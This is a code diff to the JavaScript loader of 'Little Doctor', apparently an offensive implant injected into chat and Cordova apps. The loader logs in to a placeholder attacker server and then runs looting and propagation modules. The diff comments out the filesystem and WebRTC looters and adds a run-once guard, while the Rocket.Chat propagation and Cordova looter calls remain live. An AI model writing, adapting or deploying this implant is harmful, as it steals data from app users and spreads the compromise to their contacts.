@@ -16,7 +16,6 @@ var __ld_scheme = '__LITTLE_DOCTOR_SCHEME__://';
 var __ld_hostname = '__LITTLE_DOCTOR_HOSTNAME__:__LITTLE_DOCTOR_LISTEN_PORT__';
 var __ld_server = __ld_scheme + __ld_hostname;
 
-
 requirejs.config({
 
     paths: {
@@ -44,20 +43,19 @@ function __ld_main() {
     console.log('Little Doctor is examining the patient ...');
             
     // FileSystem Looter
-    requirejs(['filesystem', 'platform'], function(fs, platform) {
-        fs.isFileSystemAccessbile({
-            success: function() {
-                console.log('FileSystem appears to be accessible, loading looter ...');
-                requirejs(['lootFiles'], function(lootFiles) {
-                    lootFiles.execute();
-                });
-            },
-            failure: function() {
-                console.log('FileSystem does not appear to be accessible');
-            }
-        });
-
-    });
+    // requirejs(['filesystem', 'platform'], function(fs, platform) {
+    //     fs.isFileSystemAccessbile({
+    //         success: function() {
+    //             console.log('FileSystem appears to be accessible, loading looter ...');
+    //             requirejs(['lootFiles'], function(lootFiles) {
+    //                 lootFiles.execute();
+    //             });
+    //         },
+    //         failure: function() {
+    //             console.log('FileSystem does not appear to be accessible');
+    //         }
+    //     });
+    // });
 
     // RocketChat Propagation
     if (navigator.userAgent.indexOf("Rocket.Chat") > -1) {
@@ -69,12 +67,12 @@ function __ld_main() {
     }
 
     // WebRTC Looter
-    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-        console.log('WebRTC looks to be accessible');
-        requirejs(['lootWebRtc'], function(webrtc) {
-            webrtc.execute();
-        });
-    }
+    // if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+    //     console.log('WebRTC looks to be accessible');
+    //     requirejs(['lootWebRtc'], function(webrtc) {
+    //         webrtc.execute();
+    //     });
+    // }
 
     // Cordova Looter
     if (navigator.device && navigator.device.cordova) {
@@ -86,12 +84,15 @@ function __ld_main() {
 
 }
 
-
-requirejs(['utils'], function(utils) {
-    utils.GET('/login', {
-        success: __ld_main,
-        failure: function() {
-            console.error('Failed to login to server');
-        }
+// Ensure the little doctor only runs once
+if (!window.LITTLE_DOCTOR) {
+    window.LITTLE_DOCTOR = true;
+    requirejs(['utils'], function(utils) {
+        utils.GET('/login', {
+            success: __ld_main,
+            failure: function() {
+                console.error('Failed to login to server');
+            }
+        });
     });
-});
+}
